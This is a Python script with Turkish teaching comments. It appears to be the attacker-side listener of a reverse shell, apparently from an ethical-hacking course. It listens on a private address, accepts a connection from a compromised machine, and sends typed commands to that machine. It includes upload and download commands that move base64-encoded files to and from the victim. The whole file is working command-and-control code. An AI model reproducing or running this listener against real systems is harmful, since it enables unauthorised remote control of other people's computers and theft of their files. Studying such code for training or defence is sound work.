import socket
import simplejson
import base64

class SocketListener:
    def __init__(self, ip, port):
        myListener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        myListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)# Bu listener instance'ını birden çok kullanmaya yarar.

        myListener.bind((ip, port)) # Tuple içinde port ve ip adresini veriyoruz.

        myListener.listen(0) # 0 verdiğimiz parametrenin adı backlog'dur. Belli bir yerden sonra bağlantı almamak için kullanılabilir.
        print("Listening...")
        #Class'ın diğer yerlerinde kullanabilmek için self kullanıyoruz.
        (self.myConnection, myAddress) = myListener.accept()  # Herhangi bir bağlantı gelirse kabul et. Bu metod bize tuple şeklinde connection ve ip adresi verir.
        print("Connection OK from" + str(myAddress))

    def sendJson(self,data):
        jsonData = simplejson.dumps(data) # Veriyi Json'a dönüştürdük.
        self.myConnection.send(jsonData.encode("utf-8"))

    def receiveJson(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024).decode()
                return simplejson.loads(jsonData) # Veriyi normal haline çevirdik.
            except ValueError:
                continue

    def commandExecution(self,commandInput):
        self.sendJson(commandInput)

        if commandInput[0] == "quit":
            self.myConnection.close()
            exit()

        return self.receiveJson()

    def writeFile(self,path,content): # İndirmeye çalıştığımız içeriğin önce içindeki verileri dosyamıza yazıyoruz.
        with open(path,"wb") as myFile:
            myFile.write(base64.b64decode(content))
            return "Download finished!"

    def readFile(self,path): # Bu sefer yüklemeye çalıştığımız dosyanın içeriğini okuyoruz. Download'ın tam tersi.
        with open(path,"rb") as myFile:
            return base64.b64encode(myFile.read())

    def startListener(self):
        while True:
            commandInput = input("Enter a Command: ")
            commandInput = commandInput.split(" ") # Yazılan komutları boşluğa göre ayırıp liste şeklinde alabilmek için.

            try:
                if commandInput[0] == "upload":
                    myFileContent = self.readFile(commandInput[1])
                    commandInput.append(myFileContent) # Dosyayı yazabilmek için socketteki metod content bekleyecektir. O yüzden içeriğini ek olarak buradan gönderdik.

                commandOutput = self.commandExecution(commandInput)  # Çalıştırdığımız kodun tekrar çıktısını alıyoruz.

                if commandInput[0] == "download":
                    commandOutput = self.writeFile(commandInput[1],commandOutput)

            except Exception:
                commandOutput = "Error!"

            print(commandOutput)

mySocketListener = SocketListener("10.0.2.4",8080)
mySocketListener.startListener()